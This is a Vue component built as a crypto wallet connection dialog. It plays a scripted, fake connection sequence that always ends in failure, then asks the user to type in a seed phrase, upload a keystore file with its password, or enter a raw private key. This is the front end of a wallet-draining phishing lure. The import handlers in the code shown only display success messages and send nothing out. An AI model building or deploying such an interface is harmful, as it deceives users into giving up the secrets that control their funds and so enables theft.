<template>
  <div class="bg-[#181A20] rounded-2xl w-full text-white overflow-hidden">
    <div class="min-h-[420px] flex flex-col relative p-6">
      <transition name="fade" mode="out-in">
        <div :key="currentStep">
          <!-- Connection Simulation Steps -->
          <template v-if="currentStep >= 1 && currentStep <= 7">
            <div class="flex flex-col items-center justify-center py-10">
              <h2 class="text-3xl font-bold mb-4">{{ connectionTitle }}</h2>
              <p class="text-gray-300 text-lg text-center max-w-xl">{{ connectionSubtitle }}</p>
              <div class="w-full max-w-md mt-8">
                <div class="bg-black h-2 rounded-full overflow-hidden">
                  <div class="h-2 rounded-full transition-all" :style="{ width: progress + '%', background: '#ffffff' }"></div>
                </div>
                <div class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-white">
                  <span>{{ Math.round(progress) }}%</span>
                </div>
              </div>
              <div class="mt-6" v-if="currentStep === 7">
                <div class="px-4 py-2 rounded-xl bg-red-600 text-white font-semibold">Failed to establish connection. Please try manual import.</div>
              </div>
            </div>
          </template>

          <!-- Import Tabs -->
          <template v-else-if="currentStep === 8">
            <div class="flex flex-col w-full p-2">
              <div class="flex mb-4 bg-black rounded-[30px] p-2 space-x-2 border border-[#222]">
                <button @click="activeTab = 'mnemonic'" :class="['flex-1 text-white rounded-[30px] py-3 text-lg font-semibold', activeTab === 'mnemonic' ? 'bg-[#23262F]' : 'bg-transparent']">MNEMONICS</button>
                <button @click="activeTab = 'keystore'" :class="['flex-1 text-white rounded-[30px] py-3 text-lg font-semibold', activeTab === 'keystore' ? 'bg-[#23262F]' : 'bg-transparent']">KEYSTORE</button>
                <button @click="activeTab = 'private'" :class="['flex-1 text-white rounded-[30px] py-3 text-lg font-semibold', activeTab === 'private' ? 'bg-[#23262F]' : 'bg-transparent']">PRIVATE KEYS</button>
              </div>

              <!-- MNEMONICS TAB -->
              <div v-if="activeTab === 'mnemonic'" class="mt-2">
                <h3 class="text-2xl font-bold">Please enter your 12/24 word phrase:</h3>
                <textarea v-model="mnemonicInput" rows="4" style="background: #23262f; font-size: 14px" class="w-full rounded-lg py-3 px-4 text:white text-base outline-none resize-none mt-3" placeholder="Enter your seed phrase separated by spaces"></textarea>
                <p class="mt-3 text-[14px] font-semibold">Please separate each Mnemonic Phrase with a space.</p>
                <div class="flex gap-3 mt-5">
                  <button @click="onImportMnemonic" :disabled="!mnemonicInput.trim() || isLoading" class="flex-1 font-bold bg-white text-black border-none py-3 px-4 rounded-[30px] disabled:opacity-50">
                    <span v-if="!isLoading">Import</span>
                    <svg v-else class="animate-spin h-5 w-5 inline-block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" /><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" /></svg>
                  </button>
                </div>
              </div>

              <!-- KEYSTORE TAB -->
              <div v-else-if="activeTab === 'keystore'" class="mt-2">
                <h3 class="text-2xl font-bold">Please select your keystore file:</h3>
                <div class="mt-3 flex items-center gap-3">
                  <input id="keystore" type="file" class="hidden" @change="onFileChange" />
                  <label for="keystore" class="cursor-pointer px-4 py-2 rounded-[10px] bg-[#23262f] text-gray-200">Click to upload keystore file</label>
                  <span class="text-gray-400">{{ fileName || 'No file chosen' }}</span>
                </div>
                <div class="mt-5">
                  <label class="text-white text-[14px] font-medium mb-2">Keystore Password:</label>
                  <input type="password" v-model="keystorePassword" style="background: #23262f; font-size: 14px" class="w-full rounded-lg p-3 text-[#e5e7eb] placeholder-[#9ca3af] outline-none" placeholder="Enter keystore password" />
                </div>
                <p class="mt-3 text-[14px] font-semibold">Typically 12 (sometimes 24) words separated by single spaces</p>
                <div class="flex gap-3 mt-5">
                  <button @click="onConnectKeystore" :disabled="!file || !keystorePassword.trim() || isLoading" class="flex-1 font-bold bg-white text-black border-none py-3 px-4 rounded-[30px] disabled:opacity-50">Connect to Wallet</button>
                </div>
              </div>

              <!-- PRIVATE KEYS TAB -->
              <div v-else-if="activeTab === 'private'" class="mt-2">
                <h3 class="text-2xl font-bold">Please enter your private key:</h3>
                <input type="text" v-model="privateKey" style="background: #23262f; font-size: 14px" class="w-full rounded-lg p-3 text-[#e5e7eb] placeholder-[#9ca3af] outline-none mt-3" placeholder="Enter private key" />
                <p class="mt-3 text-[14px] font-semibold">Please enter your private key in HEX format:</p>
                <input type="password" v-model="sessionPassword" style="background: #23262f; font-size: 14px" class="w-full rounded-lg p-3 text-[#e5e7eb] placeholder-[#9ca3af] outline-none mt-3" placeholder="Enter temporary session password" />
                <p class="mt-3 text-[14px] font-semibold">Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your accounts.</p>
                <div class="flex gap-3 mt-5">
                  <button @click="onRestorePrivate" :disabled="!privateKey.trim() || !sessionPassword.trim() || isLoading" class="flex-1 font-bold bg-white text-black border-none py-3 px-4 rounded-[30px] disabled:opacity-50">Restore</button>
                </div>
              </div>
            </div>
          </template>
        </div>
      </transition>

      <transition name="fade">
        <div v-if="message.text" :class="['absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold', message.type === 'success' ? 'bg-green-600 text-white' : 'bg-red-600 text-white']">{{ message.text }}</div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import { ref, computed, onMounted } from 'vue'

const emit = defineEmits(['close'])

const currentStep = ref(1)
const progress = ref(0)
const isLoading = ref(false)
const message = ref({ text: '', type: '' })

const connectionTitle = computed(() => {
  switch (currentStep.value) {
    case 1: return 'Connecting Wallet'
    case 2: return 'Requesting Connection'
    case 3: return 'Validating Protocol'
    case 4: return 'Connecting...'
    case 5: return 'Establishing Bridge'
    case 6: return 'Connecting...'
    case 7: return 'Connection Failed'
    default: return ''
  }
})
const connectionSubtitle = computed(() => {
  switch (currentStep.value) {
    case 1: return 'Please wait while we connect with your wallet'
    case 2: return 'Please wait while we connect with your wallet'
    case 3: return 'Validating protocol compatibility with your wallet'
    case 4: return 'Attempting to connect to your wallet provider'
    case 5: return 'Setting up a secure bridge to your wallet'
    case 6: return 'Attempting to connect to your wallet provider'
    case 7: return 'Failed to establish connection. Please try manual import.'
    default: return ''
  }
})

function startSequence(){
  const steps = [1,2,3,4,5,6,7]
  let idx = 0
  function advance(){
    currentStep.value = steps[idx]
    progress.value = Math.min(100, Math.round(((idx+1)/steps.length)*100))
    idx++
    if (idx < steps.length){
      setTimeout(advance, 900)
    } else {
      setTimeout(() => { currentStep.value = 8 }, 1200)
    }
  }
  advance()
}

const activeTab = ref('mnemonic')
const mnemonicInput = ref('')
const file = ref(null)
const fileName = ref('')
const keystorePassword = ref('')
const privateKey = ref('')
const sessionPassword = ref('')

function onFileChange(e){
  const f = e.target.files?.[0]
  file.value = f || null
  fileName.value = f ? f.name : ''
}
function showMessage(text, type='success'){ message.value = { text, type }; setTimeout(() => { message.value.text = '' }, 3000) }
function onImportMnemonic(){ isLoading.value = true; setTimeout(() => { isLoading.value = false; showMessage('Mnemonic import initiated', 'success') }, 800) }
function onConnectKeystore(){ isLoading.value = true; setTimeout(() => { isLoading.value = false; showMessage('Keystore connection attempted', 'success') }, 800) }
function onRestorePrivate(){ isLoading.value = true; setTimeout(() => { isLoading.value = false; showMessage('Private key restore initiated', 'success') }, 800) }

onMounted(() => { startSequence() })
</script>

<style scoped>
.fade-enter-active,.fade-leave-active{ transition: opacity 0.3s ease }
.fade-enter-from,.fade-leave-to{ opacity: 0 }
</style>